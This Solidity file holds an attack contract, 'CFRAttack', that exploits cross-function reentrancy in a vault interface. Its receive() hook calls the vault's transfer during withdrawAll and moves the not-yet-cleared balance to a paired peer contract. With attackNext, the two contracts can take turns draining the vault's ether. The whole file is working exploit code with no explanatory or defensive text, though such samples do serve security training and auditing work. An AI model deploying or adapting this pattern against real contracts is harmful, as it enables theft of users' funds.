// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

interface ICFRVault {
    function deposit() external payable;

    function transfer(address _to, uint256 _amount) external;

    function withdrawAll() external;

    function userBalance(address _user) external view returns (uint256);
}

/// @title CFRAttack
/// @author mektigboy
contract CFRAttack {
    //////////////
    /// ERRORS ///
    //////////////

    error CFTAttack__UnmetMinimumETH();

    ///////////////
    /// STORAGE ///
    ///////////////

    ICFRVault public immutable cfrVault;

    CFRAttack public cfrAttackPeer;

    ///////////////////
    /// CONSTRUCTOR ///
    ///////////////////

    constructor(address _cfrVault) {
        cfrVault = ICFRVault(_cfrVault);
    }

    ///////////////
    /// RECEIVE ///
    ///////////////

    receive() external payable {
        if (address(cfrVault).balance >= 1 ether) {
            cfrVault.transfer(
                address(cfrAttackPeer),
                cfrVault.userBalance(address(this))
            );
        }
    }

    //////////////////////
    /// EXTERNAL LOGIC ///
    //////////////////////

    function initializeAttack() external payable {
        if (msg.value != 1 ether) revert CFTAttack__UnmetMinimumETH();

        cfrVault.deposit{value: 1 ether}();
        cfrVault.withdrawAll();        
    }

    function attackNext() external {
        cfrVault.withdrawAll();
    }

    ////////////////
    /// SETTINGS ///
    ////////////////

    function updateCFRAttackPeer(address _cfrAttackPeer) external {
        cfrAttackPeer = CFRAttack(payable(_cfrAttackPeer));
    }

    ///////////////
    /// GETTERS ///
    ///////////////

    function balance() external view returns (uint256) {
        return address(this).balance;
    }
}
